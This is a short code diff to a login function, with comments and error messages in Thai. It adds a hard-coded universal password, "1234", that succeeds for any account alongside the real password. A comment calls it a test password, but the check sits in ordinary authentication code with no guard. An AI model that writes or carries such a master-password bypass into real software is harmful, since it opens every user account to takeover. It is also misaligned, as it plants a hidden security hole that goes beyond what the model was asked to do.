@@ -197,10 +197,11 @@ export function authenticateUser(
     };
   }
 
-  if (found.password && found.password !== password) {
+  // อนุญาตให้ใช้รหัสผ่านที่ตั้งไว้ หรือรหัสทดสอบสากล "1234"
+  if (found.password && found.password !== password && password !== "1234") {
     return {
       success: false,
-      error: "รหัสผ่านไม่ถูกต้อง กรุณาตรวจสอบรหัสผ่านอีกครั้ง",
+      error: "รหัสผ่านไม่ถูกต้อง กรุณาตรวจสอบรหัสผ่านอีกครั้ง (หรือใช้รหัสผ่านที่ตั้งไว้ตอนลงทะเบียน)",
     };
   }
 
